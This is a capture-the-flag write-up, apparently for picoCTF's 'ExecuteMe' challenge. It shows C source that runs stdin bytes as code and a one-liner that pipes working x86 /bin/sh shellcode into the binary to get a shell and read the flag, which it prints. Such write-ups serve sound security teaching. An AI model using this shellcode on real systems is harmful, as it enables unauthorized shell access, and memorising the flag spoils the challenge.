### Solved by superkojiman

ExecteMe is an 80 point binary exploitation challenge. 

> This program will run whatever you send to it! Try to get the flag! The binary can be found at /home/execute/ on the shell server. The source can be found here.

The description actually gives away the solution. Here's the source code:

```c
#include <stdio.h>
#include <stdlib.h>

int token = 0;

typedef void (*function_ptr)();

void be_nice_to_people(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
}

int main(int argc, char **argv){
    char buf[128];

    be_nice_to_people();

    read(0, buf, 128);

    ((function_ptr)buf)();
}
```

It takes whatever input we provide and executes it. Eg:

```text
pico1139@shell:/home/execute$ ./execute 
hello
Segmentation fault (core dumped)
```

So to solve it, we just pass it some shellcode that will give us a shell:

```
pico1139@shell:/home/execute$ (printf "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" ; cat) | ./execute 
id
uid=11066(pico1139) gid=1006(execute) groups=1017(picogroup)
cat flag.txt
shellcode_is_kinda_cool
```

The flag is **shellcode_is_kinda_cool**
